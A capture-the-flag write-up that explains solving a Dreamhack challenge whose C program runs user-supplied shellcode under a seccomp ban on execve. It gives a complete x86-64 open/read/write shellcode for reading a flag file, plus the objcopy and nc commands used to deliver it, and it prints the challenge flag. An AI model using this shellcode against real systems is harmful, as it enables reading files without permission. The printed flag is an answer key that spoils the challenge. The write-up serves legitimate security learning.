### The challengee

Based on the source code of the program hosted on dreamhacks VM, the program allows you to execute shellcode as input, however there are two rules implemented using secure computing which prevents `execve` and `execveat` syscalls from being executed. The objective is to get the flag which they provided the full path `"/home/shell_basic/flag_name_is_loooooong"`.  My method is to directly read the contents from the flag.

```c
#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   
  void (*sc)();
  
  init();
  
  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

After testing the code numerous times by compiling and running it locally, I can confirm I am able to read the contents of my flag. Initially, since I was very new to assembly, I realized things such as creating variables under `.data` and `.bss` are rendered useless when executing shellcode as the only code that will be executed is from the `.text` section.  So I had to re-implement my string and buffer.  I did this by manually writing the path and converting it to hex, then manually converting the values to little-endian (reverse the bytes).  Next, the buffer was done by subtracting `256` from the stack.

I learned how to error handle syscalls by comparing the return value stored in `rax` and determin if the value is signed (a negative value). If so, it will exit or close the file descriptor handle.

Another thing I learned.. when using the `open` syscall, when creating a handle to a given filename, if the filename is very long, of course you will need to segment your filename into 8 byte chunks, but also the size is important. I originally pushed each value directly to the stack, when debugging, the values are observd 4 bytes each. Likely nasm `things`.  A thanks to @jord and @szymex for helping me better understand that it is ultimately better to assign the values to x64 bit registers then pushing them.

```asm
section .text
global _start

_start:
       ; syscall(open, "/home/shell_basic/flag_name_is_loooooong")
        push 0x0
        mov r8, 0x676e6f6f6f6f6f6f
        push r8
        mov r8, 0x6c5f73695f656d61
        push r8
        mov r8, 0x6e5f67616c662f63
        push r8
        mov r8, 0x697361625f6c6c65
        push r8
        mov  r8, 0x68732f656d6f682f
        push r8
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 0x2
        syscall

        cmp rax, 0x0
        js _exit

        ; read(int fd, void buf[.count], size_t count);
        ; syscall(read, fd, buffer, bufferlen)
        mov rbx, rax ; copy fd
        xor rax, rax
        mov rdi, rbx ; fd
        sub rsp, 0x100
        mov rsi, rsp ; move buffer size to rsi
        mov rdx, 0x100 ; buffer length 256
        syscall

        cmp rax, 0x0
        jle .close_fd

        ; syscall(write, int fd, void buffer, size_t length)
        mov rdi, 0x1 ; stdout
        mov rdx, rax ; length
        mov rax, 0x1 ; write
        syscall

.close_fd:
        ; syscall(close, fd)
        mov rdi, rbx
        mov rax, 0x3
        syscall

_exit:
        ; syscall(exit, 0x0)
        xor rdi, rdi
        mov rax, 0x3c ; exit
        syscall
```

### Converting my object file into shellcode

I used objcopy to extract the `.text` section from the object file and output is as a bin file.
```
objcopy --dump-section .text=x.bin x.o
```

### Retrieving the flag

```
nc host3.dreamhack.games 22761 < x.bin
shellcode: DH{ca562d7cf1db6c55cb11c4ec350a3c0b}
```
